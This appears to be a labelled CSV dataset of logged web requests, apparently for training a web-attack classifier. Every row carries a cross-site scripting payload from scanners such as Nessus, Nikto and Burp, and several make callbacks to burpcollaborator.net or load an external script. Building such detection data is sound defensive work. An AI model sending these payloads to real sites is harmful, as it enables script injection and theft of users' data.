id,method,user_agent,url,refer,body,lable
224,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/quarantine/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/5qwfph7hx6tl330ndk2m9zt9h0nubozgq4hw4msbX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e,http://121.4.111.58:3000/ftp/quarantine,"GET /ftp/quarantine/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/5qwfph7hx6tl330ndk2m9zt9h0nubozgq4hw4msbX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp/quarantine  ",5
149,GET,python-requests/2.18.4,/index.php?_t_t_t=0.6178973200730979&c=waterfall&wid=ea58d92ac5c231ebf89a569a47b6176f&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&srcg=gaia_ios&src=gaia_ios_history&q=%e7%88%b1%e8%8a%b1%e4%b9%8b%e7%8b%bc%3C/script%3E%3Cimg%20src=1%20onerror=alert(42873)%3E,,,5
476,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/6u1qakpc4se0ogvjfeqfntjf2680wxkpbd80yonX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/package.json.bak,http://121.4.111.58:3000/ftp/,"GET /javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/6u1qakpc4se0ogvjfeqfntjf2680wxkpbd80yonX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/package.json.bak HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp/  ",5
158,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/suspicious_errors.yml?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2ffcvxqz0d4maxjkw6kaqjym5af1lv9pxho5is8gxX%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1,http://121.4.111.58:3000/ftp/,"GET /ftp/suspicious_errors.yml?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2ffcvxqz0d4maxjkw6kaqjym5af1lv9pxho5is8gxX%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1 HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp/  ",5
2866,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/carbon/resources/add_collection_ajaxprocessor.jsp?collectionName=%3Cimg%20src=x%20onerror=alert(document.domain)%3E&parentPath=%3Cimg%20src=x%20onerror=alert(document.domain)%3E,,,5
3960,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/extmail/cgi/oh2cb4wl.php?<script>document.cookie=%22testafzq=4149;%22</script>,,,5
116,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/tspb6dgrk0qbzyck0o6xe0lovf1ap4dw4kvci26rX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e,http://121.4.111.58:3000/ftp,"GET /ftp/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/tspb6dgrk0qbzyck0o6xe0lovf1ap4dw4kvci26rX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp  ",5
1519,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/<script>cross_site_scripting.nasl</script>.cgi,,,5
231,GET,python-requests/2.18.4,/resource/avatar/avatar.php%22%20onmouseover=prompt(42873)%20bad=%22.rar,,,5
757,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36","/v3/docs/bootstrap/javascript.html""%3C%53%63%52%69%50%74%20%0D%0A%3E%70%42%35%65%28%39%35%39%36%29%3C%2F%53%63%52%69%50%74%3E",http://114.251.10.253/,"GET /v3/docs/bootstrap/javascript.html""%3C%53%63%52%69%50%74%20%0D%0A%3E%70%42%35%65%28%39%35%39%36%29%3C%2F%53%63%52%69%50%74%3E HTTP/1.1 Referer: http://114.251.10.253/ Cookie: jwplayer.mute=false;jwplayer.volume=NaN Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate Host: 114.251.10.253 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive  GET /v3/docs/bootstrap/javascript.html""%3C%53%63%52%69%50%74%2F%61%63%75%20%73%72%63%3D%2F%2F%78%73%73%2E%62%78%73%73%2E%6D%65%2F%74%2F%78%73%73%2E%6A%73%3F%39%37%37%34%3E%3C%2F%53%63%52%69%50%74%3E HTTP/1.1 Referer: http://114.251.10.253/ Cookie: jwplayer.mute=false;jwplayer.volume=NaN Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate Host: 114.251.10.253 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive  ",5
93,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/9w4sm2e0.cgi?<script>document.cookie=%22testdrkg=4701;%22</script>,,,5
2882,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/wp-content/plugins/enhanced-tooltipglossary/backend/views/admin_importexport.php?itemsnumber=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&msg=imported,,,5
3928,GET,"Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36",/pan/scripts/wa.exe?OK=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
2741,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/wp-content/plugins/yousaytoo-auto-publishing-plugin/yousaytoo.php?submit=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
3652,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/scripts/60teglc6.exe?<script>document.cookie=%22testlqex=3433;%22</script>,,,5
495,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/0cdkse76mmwu6addx8895n19k0quex2ptdq0go5X%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/announcement_encrypted.md,http://121.4.111.58:3000/ftp/,"GET /javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/0cdkse76mmwu6addx8895n19k0quex2ptdq0go5X%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/announcement_encrypted.md HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp/  ",5
2241,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/extman/default/60teglc6.html?<script>document.cookie=%22testlqex=3433;%22</script>,,,5
103,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/order_53f7-c649066b047df5f5.pdf?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2f6y5ocqm4qdwo5bix61cakdr11s7nvfj7av4iu6jX%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1,http://121.4.111.58:3000/ftp,"GET /ftp/order_53f7-c649066b047df5f5.pdf?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2f6y5ocqm4qdwo5bix61cakdr11s7nvfj7av4iu6jX%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1 HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp  ",5
2879,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/?uid=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E,,,5
2756,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/wp-content/plugins/navis-documentcloud/js/window.php?wpbase=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
4149,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/plugins/servlet/svnwebclient/changedResource.jsp?url=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E,,,5
3958,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/extman/default/<script>cross_site_scripting.nasl</script>,,,5
724,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36","/hbdt/gcyg/ylyslghg/""%3C%69%6D%67%3C%21%2D%2D%20%2D%2D%3E%20%73%72%63%3D%78%20%6F%6E%65%72%72%6F%72%3D%61%6C%65%72%74%28%39%34%39%38%29%3B%2F%2F%3E%3C%21%2D%2D%20%2D%2D%3E",http://114.251.10.253/,"GET /hbdt/gcyg/ylyslghg/""%3C%69%6D%67%3C%21%2D%2D%20%2D%2D%3E%20%73%72%63%3D%78%20%6F%6E%65%72%72%6F%72%3D%61%6C%65%72%74%28%39%34%39%38%29%3B%2F%2F%3E%3C%21%2D%2D%20%2D%2D%3E HTTP/1.1 Referer: http://114.251.10.253/ Cookie: jwplayer.mute=false;jwplayer.volume=NaN Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate Host: 114.251.10.253 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive  ",5
461,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/k5q4ly0qf6pezu6xqs1ty7utdkjd745sxjladx3lsX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e,,"GET /javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/k5q4ly0qf6pezu6xqs1ty7utdkjd745sxjladx3lsX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0  ",5
1234,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/console/faces/com_sun_web_ui/help/masthead.jsp?windowTitle=%3c/title%3e%3cscript%3ealert(%27sun_java_web_console_helpwindow_xss.nasl%27)%3c/script%3e,,,5
2237,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/extman/cgi/changepwd.cgi?cancel=%FF%FE%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%32%30%33%29%3C%2F%73%63%72%69%70%74%3E,,,5
167,GET,python-requests/2.18.4,/Activity/edit?start_time=2016-07-05+00%3A00%3A00&end_time=2016-12-31+00%3A00%3A00&image=88888&is_popup=0&detail=%3Cp%3E%E6%A0%B9%E6%8D%AE%E4%BA%A7%E5%93%81%E9%9C%80%E6%B1%82%EF%BC%8C%E2%80%9C%E4%B8%BB%E6%92%AD%E8%AF%84%E7%BA%A7%E7%94%B3%E8%AF%B7%E2%80%9D%E7%9A%84%E9%9C%80%E6%B1%82%E6%9C%89%E4%B8%AA%E5%B0%8F%E8%B0%83%E6%95%B4%EF%BC%9A%3C%2Fp%3E%3Cp%3E1.+%E7%94%B3%E8%AF%B7%E6%B5%81%E7%A8%8B%E8%B0%83%E6%95%B4%EF%BC%9A%E4%B9%8B%E5%89%8D%E5%85%88%E8%BE%93%E5%85%A5%E3%80%90%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E3%80%91%E5%86%8D%E9%80%89%E6%8B%A9%E3%80%90%E6%A0%87%E7%AD%BE%E3%80%91%EF%BC%8C%E6%94%B9%E4%B8%BA%E5%85%88%E9%80%89%E6%8B%A9%E3%80%90%E6%A0%87%E7%AD%BE%E3%80%91%E5%86%8D%E8%BE%93%E5%85%A5%E3%80%90%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E3%80%91%EF%BC%882%E4%B8%AA%E9%A1%BA%E5%BA%8F%E9%A2%A0%E5%80%92%E4%B8%8B%EF%BC%89%E3%80%82%3C%2Fp%3E%3Cp%3E2.+%E4%BF%A1%E6%81%AF%E4%BF%9D%E5%AD%98%E6%9C%BA%E5%88%B6%EF%BC%9A%E7%94%A8%E6%88%B7%E6%AF%8F%E5%AE%8C%E6%88%901%E4%B8%AA%E7%94%B3%E8%25&id=1&sequence=88888&url=http://www.hacker.org/%3Cscript%3Ealert(42873)%3C/script%3E,,,5
2819,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/wp-content/plugins/marmoset-viewer/mviewer.php?id=http://</script><svg/onload=alert(%272CQ60toYlTtsorhiYNEi4T6fznQ%27)>,,,5
4205,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,"/data/autosuggest-remote.php?q=""><img%20src=x%20onerror=alert(1)>",,,5
3510,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/extman/cgi/changepwd.cgi?cancel=%3Cscript%3Ealert(216)%3B%3C%2Fscript%3E,,,5
3916,GET,"Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36",/pan/plugins/address_add/add.php?first=HOVER%20ME!%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
731,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36","/v3/docs/index.html""%3C%69%6D%67%3C%21%2D%2D%20%2D%2D%3E%20%73%72%63%3D%78%20%6F%6E%65%72%72%6F%72%3D%61%6C%65%72%74%28%39%33%33%38%29%3B%2F%2F%3E%3C%21%2D%2D%20%2D%2D%3E",http://114.251.10.253/,"GET /v3/docs/index.html""%3C%69%6D%67%3C%21%2D%2D%20%2D%2D%3E%20%73%72%63%3D%78%20%6F%6E%65%72%72%6F%72%3D%61%6C%65%72%74%28%39%33%33%38%29%3B%2F%2F%3E%3C%21%2D%2D%20%2D%2D%3E HTTP/1.1 Referer: http://114.251.10.253/ Cookie: jwplayer.mute=false;jwplayer.volume=NaN Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate Host: 114.251.10.253 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive  ",5
4828,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,"/cs/idcplg?IdcService=GET_SEARCH_RESULTS&ResultTemplate=StandardResults&ResultCount=20&FromPageUrl=/cs/idcplg?IdcService=GET_DYNAMIC_PAGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA""&PageName=indext&SortField=dInDate&SortOrder=Desc&ResultsTitle=XXXXXXXXXXXX%3Cscript%3Ealert(31337)%3C%2Fscript%3E&dSecurityGroup=&QueryText=(dInDate+%3E=+%60%3C$dateCurrent(-7)$%3E%60)&PageTitle=OO",,,5
280,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/vendor.js?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fy2181aja9z5efwcgpdefls52ttzmncb42swfm3bX%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1,http://121.4.111.58:3000/,"GET /vendor.js?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fy2181aja9z5efwcgpdefls52ttzmncb42swfm3bX%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1 HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/  ",5
1116,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36",/url?hl=%3C%2FbODy%3E%3CIMg+id%3D%27KEiowsvd%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CBOdY%3E&pref=%3C%2FbOdy%3E%3CIMg+id%3D%27KBozfguu%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CBoDy%3E&pval=%3C%2FBoDy%3E%3CimG+id%3D%27WsVoWYMc%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CbodY%3E&q=%3C%2FbODY%3E%3CImG+id%3D%27GTItqFvI%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CbOdY%3E&sa=%3C%2FbODy%3E%3CimG+id%3D%27fJTqIZmt%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CBOdY%3E&usg=%3C%2FBODy%3E%3CIMG+id%3D%27vjVYWehj%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CboDY%3E&ust=%3C%2FbOdY%3E%3CiMg+id%3D%27GYefYWRI%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CBodY%3E,,,5
3008,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/portal/resources/css/wk70ls4m.pl?<script>document.cookie=%22testqbli=447;%22</script>,,,5
3818,GET,Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000802),/replymsg.php?send=1&destin=<script>alert('Vulnerable')</script>,,"<!--#include virtual=""/index.jsp""-->",5
2852,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/src/search.php?mailbox=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&what=x&where=BODY&submit=Search,,,5
2827,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/remote/error?errmsg=ABABAB--%3E%3Cscript%3Ealert(1337)%3C/script%3E,,,5
4183,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/?author=1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
1526,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/cgi-bin/<script>cross_site_scripting.nasl</script>.fts,,,5
766,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36","/v3/docs/font-awesome/""%25%33%43%25%35%33%25%36%33%25%35%32%25%36%39%25%35%30%25%37%34%25%32%30%25%33%45%25%37%34%25%34%45%25%35%34%25%36%38%25%32%38%39%37%34%34%25%32%39%25%33%43%25%32%46%25%37%33%25%34%33%25%37%32%25%36%39%25%37%30%25%35%34%25%33%45",http://114.251.10.253/,"GET /v3/docs/font-awesome/""%25%33%43%25%35%33%25%36%33%25%35%32%25%36%39%25%35%30%25%37%34%25%32%30%25%33%45%25%37%34%25%34%45%25%35%34%25%36%38%25%32%38%39%37%34%34%25%32%39%25%33%43%25%32%46%25%37%33%25%34%33%25%37%32%25%36%39%25%37%30%25%35%34%25%33%45 HTTP/1.1 Referer: http://114.251.10.253/ Cookie: jwplayer.mute=false;jwplayer.volume=NaN Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate Host: 114.251.10.253 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive  ",5
4937,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36",/OlwAK%3COlwAK%3EOlwAK%27OlwAK%22OlwAK/OlwAK-OlwAK/ddljson?async=%3C%2FbOdY%3E%3CImg+id%3D%27InXvhkjj%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CBody%3E,,,5
4218,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/maxsite/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
2800,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/wp-content/plugins/hero-maps-pro/views/dashboard/index.php?v=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
11,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/portal/resources/csssearch-results.dot?search_query=nessus%22%3e%3cscript%3ealert('dotcms_search_query_xss.nasl')%3c%2fscript%3e%2f,,,5
2772,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/wp-login.php?redirect_to=http%3A%2F%2F%3F1%3C%2FsCripT%3E%3CsCripT%3Ealert%28document.domain%29%3C%2FsCripT%3E,,,5
3817,GET,Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000804),"/postnuke/modules.php?op=modload&name=Web_Links&file=index&req=viewlinkdetails&lid=666&ttitle=Mocosoft+Utilities\""%3<script>alert('Vulnerable')</script>",,"<!--#include virtual=""/index.jsp""-->",5
